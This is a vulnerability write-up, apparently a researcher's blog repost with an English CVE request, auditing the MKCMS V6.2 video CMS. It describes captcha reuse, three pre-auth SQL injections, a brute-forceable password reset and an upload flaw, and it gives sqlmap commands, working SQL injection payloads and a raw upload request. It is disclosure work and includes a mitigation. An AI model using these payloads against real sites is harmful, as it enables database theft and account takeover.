---
title: "【投稿】MKCMS代码审计小结"
slug: szhnn0
date: 2020-04-10T21:55:55+08:00
source: yuque/penetration
---

原文首发于先知社区[MKCMS代码审计小结 - 先知社区](https://xz.aliyun.com/t/7580)



> MKCMS V6.2    (以下源码来自网络)
>
> MKCMS米酷影视源码6.2开源CMS
>
> 下载地址链接：[https://pan.baidu.com/s/1cZX5x9SbcXMCMXismfH4ow](https://pan.baidu.com/s/1cZX5x9SbcXMCMXismfH4ow)  提取码：k3ox
>
> 备用下载地址：[https://www.lanzous.com/ib7zwmh](https://www.lanzous.com/ib7zwmh)
>



![](https://cdn.nlark.com/yuque/0/2021/png/166008/1637212203651-bd33ce55-3bea-4e5e-b129-bbe3ad474665.png)



## .htaccess
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1637212300645-2fdfae47-c768-4bf1-980a-f1c2abb5bd44.png)







# 0x00 全局过滤分析
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1637212074702-2da62da1-103e-44e1-a381-99ae355f1a6f.png)



`/system/library.php:`使用`addslashes`转义入参, 注意到`$_SERVER`未被过滤

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586576535561-9161a459-66b4-4503-b922-836306186781.png)



# 0x01 验证码重用
`/admin/cms_login.php`验证码处的逻辑如下，比较session中的验证码和输入的是否一致，不一致就进入`alert_href`，这个`js`跳转，实际是在刷新页面

```php
/admin/cms_login.php:
<?php 
 6   ...
 7  if(isset($_POST['submit'])){
 8:     if ($_SESSION['verifycode'] != $_POST['verifycode']) {
 9  		alert_href('验证码错误','cms_login.php');
10  	}
   ...
     
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586527513750-5968d776-6be5-4cab-bdec-e2f61f12998c.png)

跳转后就会刷新验证码，然而我用的是burp，默认是不解析js的



全局搜索这个`$_SESSION['verifycode']`，发现只在`/system/verifycode.php`有赋值，也就是说，如果使用验证码后，我们不跟随`js`跳转，就不会重置验证码，**验证码也就能被重复使用**了

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586526980113-b6ec9c98-72ea-4dac-926d-b2eef01f0227.png)

使用burp重放，的确如此，验证码形同虚设



# 0x02 前台注入1：`/ucenter/repass.php`
看了下历史的漏洞，在`/ucenter/repass.php`有个越权修改密码的洞（[CVE-2019-11332](https://nvd.nist.gov/vuln/detail/CVE-2019-11332)），跟进去发现原来还有注入，以下是分析过程

```php
/ucenter/repass.php
<?php
...
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
$email = trim($_POST['email']);
// 检测用户名是否存在
$query = mysql_query("select u_id from mkcms_user where u_name='$username' and u_email='$email'");
  ...
    
```

前面说到全局对`$_POST`存在`addslash`的过滤（加`\`转义），上面又把参数给`stripslashes`了(去掉`\`），这不就是个注入？

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586529907632-efc6c088-ccac-49d1-9a5e-192abfb8293d.png)

后来复盘，实际上，这个问题`coolcat`师傅早在去年就在先知上提出来了：[某KCMS5.0 代码审计 (前台注入&任意用户密码重置)，](https://xz.aliyun.com/t/4189#toc-1)师傅nb！



# 0x03 前台注入2：/ucenter/active.php
`/ucenter/active.php?verify=1`存在注入

```php
/ucenter/active.php
<?php
...
$verify = stripslashes(trim($_GET['verify']));	//去掉了转义用的\
$nowtime = time();
$query = mysql_query("select u_id from mkcms_user where u_question='$verify'");
$row = mysql_fetch_array($query);
...
```

sqlmap直接跑即可

```php
[INFO] GET parameter 'verify' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[INFO] GET parameter 'verify' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
```





# 0x04 前台注入3：/ucenter/reg.php
`/ucenter/reg.php`的`name`参数，存在注入

```php
/ucenter/reg.php
<?php 
...
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
// 检测用户名是否存在
$query = mysql_query("select u_id from mkcms_user where u_name='$username'");
  ...
```



# 0x05 任意用户密码找回（密码可被穷举）
任意用户密码找回

这个问题主要是`/ucenter/repass.php`代码里，找回密码的逻辑有问题，第10行查询到`username`、 `email`能对应上之后，14行就直接重置密码了。。。而且密码的范围在12行有写，只有90000种可能，重置之后，burp跑一下不就ok了？（当然要结合验证码重用才能有效爆破）

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586531781382-73625b5c-3937-4196-bbc2-6cf8f6502f37.png)



# 0x06 备份文件路径可猜解
这个备份功能也太顶了，而且还是那么简单的文件名

`/backupdata/movie.sql`

```php
/admin/cms_backup.php
<?php
$filename="../backupdata/".DATA_NAME.".sql"; //存放路径，默认存放到项目最外层
$fp = fopen($filename,'w');
fputs($fp,$mysql);
fclose($fp);
alert_href('备份成功!','cms_data.php');
?>
```

全局搜`DATA_NAME`变量，是安装时候设置的数据库名

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586532921372-d8f79355-fc36-4612-8234-3a24d17571ba.png)



默认的`DATA_NAME`值是`movie`

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586533096304-2b6954a4-c78e-43ed-a0a0-39d0b69ec5c7.png)



# 0x07 前台文件上传
`/editor/php/upload_json.php?dir=file`

源码如下

```php
<?php 
$ext_arr = array(
	'image' => array('gif', 'jpg', 'jpeg', 'png', 'bmp'),
	'flash' => array('swf', 'flv'),
	'media' => array('swf', 'flv', 'mp3', 'wav', 'wma', 'wmv', 'mid', 'avi', 'mpg', 'asf', 'rm', 'rmvb'),
	'file' => array('doc', 'docx', 'xls', 'xlsx', 'ppt', 'htm', 'html', 'txt', 'zip', 'rar', 'gz', 'bz2' ,'7z'),
);
...
$file_name = $_FILES['imgFile']['name'];
...
//获得文件扩展名
	$temp_arr = explode(".", $file_name);
	$file_ext = array_pop($temp_arr);
	$file_ext = trim($file_ext); /*将file_ext转换为字符串。。。无弱类型问题了**/
	$file_ext = strtolower($file_ext);  //将file_ext转换为字符串。。。无弱类型问题了
	//检查扩展名，是否在大的数组中，in_array存在若类型问题
	if (in_array($file_ext, $ext_arr[$dir_name]) === false) {
		alert("上传文件扩展名是不允许的扩展名。\n只允许" . implode(",", $ext_arr[$dir_name]) . "格式。");
	}result
  ...
  
  
```

可以上传列表里的文件，只是无法拿shell

```http
POST /editor/php/upload_json.php?dir=file HTTP/1.1
Host: localhost
Content-Length: 306
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryni3BwmVzIUwKfSSC
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryni3BwmVzIUwKfSSC
Content-Disposition: form-data; name="imgFile"; filename="1.jpg.html"
Content-Type: application/octet-stream

11111111
------WebKitFormBoundaryni3BwmVzIUwKfSSC
Content-Disposition: form-data; name="upload"

Send
------WebKitFormBoundaryni3BwmVzIUwKfSSC--

```

出现上传链接

# 0x08 凭据硬编码
`/ucenter/yanzhengma.php`, 把密码硬编码在里面了，经过测试，可登录（~~狗头保命~~![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586684264225-6679e12b-ad44-4554-9c50-fffeb4a39bcd.png)

# 0x09 越权
`/ucenter/mingxi.php`

会员卡信息仅由用户传入的参数确定，一定存在越权漏洞

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586685476288-83c13069-03f6-4f34-8897-0f0830027cee.png)







# 后记
## txprotect.php
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1637212179406-a3b9f3b3-3747-4c1e-94cc-866b73382dea.png)



---

# CVE Request : English Version
> Source code can be downloaded  at  [https://www.lanzous.com/ib7zwmh](https://www.lanzous.com/ib7zwmh)
>



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586581112081-f4a882d1-ad62-40f9-9a0c-d9188bad1a68.png)

# 0x00:Lead In
This CMS is kinda funny, coz there is a universal filter `addslashes`  in `/system/library.php`

```php
/system/library.php
<?php
...
if (!get_magic_quotes_gpc()) {
	if (!empty($_GET)) {
		$_GET = addslashes_deep($_GET);
	}
	if (!empty($_POST)) {
		$_POST = addslashes_deep($_POST);
	}
	$_COOKIE = addslashes_deep($_COOKIE);
	$_REQUEST = addslashes_deep($_REQUEST);
}
function addslashes_deep($_var_0)
{
	if (empty($_var_0)) {
		return $_var_0;
	} else {
		return is_array($_var_0) ? array_map('addslashes_deep', $_var_0) : addslashes($_var_0);
	}_var_0
}
```



While it uses `stripslashes` somewhere by mistake,  let's do a global search about it, we get** 3 SQL injections **

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586576676672-8bef147b-e4c1-4e41-951b-38e9cc20e422.png)

# 0x01:PreAuth SQL injection in /ucenter/repass.php
MKCMS V6.2 has SQL injection via the /ucenter/repass.php _name_ parameter.	

```php
/ucenter/repass.php
<?php
...
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
$email = trim($_POST['email']);
// 检测用户名是否存在
$query = mysql_query("select u_id from mkcms_user where u_name='$username' and u_email='$email'");
  ...
    
```

and it can be automated exploited by sqlmap namely

```php
sqlmap -u http://localhost/ucenter/repass.php  --data "name=1&email=1@1.com" -p name 


Parameter: name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=11' AND (SELECT 7672 FROM (SELECT(SLEEP(5)))NmRk) AND 'VTKx'='VTKx&email=222@222.m&submit=

```

And this can be tracked in 2019 via [https://xz.aliyun.com/t/4189#toc-1  ](https://xz.aliyun.com/t/4189#toc-1)by [CoolCat](https://xz.aliyun.com/u/12470), so CVE request of this vuln won't belong to me, I just wanna enrich the CVE database.

# 0x02:PreAuth SQL injection in /ucenter/active.php
MKCMS V6.2 has SQL injection via the /ucenter/active.php _verify_ parameter.	

```php
/ucenter/active.php
<?php
...
$verify = stripslashes(trim($_GET['verify']));	//去掉了转义用的\
$nowtime = time();
$query = mysql_query("select u_id from mkcms_user where u_question='$verify'");
$row = mysql_fetch_array($query);
...
```



Likewise, attackers can exploit it via sqlmap by typing

```shell
sqlmap -u http://localhost/ucenter/active.php?verify=1 


Parameter: verify (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: verify=1' AND (SELECT 5656 FROM (SELECT(SLEEP(5)))xcPF) AND 'TRJq'='TRJq

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: verify=1' UNION ALL SELECT CONCAT(0x7171786b71,0x706d4e457048744251624653456d554a685a77654c66497a736d704c7454586462716f457a56587a,0x71707a7671)-- WUGv
		
```

# 0x03:PreAuth SQL injection in /ucenter/reg.php
MKCMS V6.2 has SQL injection via the /ucenter/reg.php _name_ parameter.h

```php
/ucenter/reg.php
<?php 
...
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
// 检测用户名是否存在
$query = mysql_query("select u_id from mkcms_user where u_name='$username'");
  ...
```

Again, sqlmap can be used to automate the exploitation

```php
sqlmap -u http://localhost/ucenter/reg.php  --data "name=1&submit=1@1.com" -p name  


Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=1' AND 2487=2487 AND 'WOhs'='WOhs&submit=1@1.com

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=1' AND (SELECT 6840 FROM (SELECT(SLEEP(5)))rygh) AND 'eoEE'='eoEE&submit=1@1.com

```

# 0x04:Mitigation
remove the `stripslashes()` before the POST/GET param, thus we can't exploit it unless the coding of MYSQL is GBK/GB2312, i.e._wide byte sql injection._

(In my opinion,  is there any need to escape the name? it has never been allowed at all !  

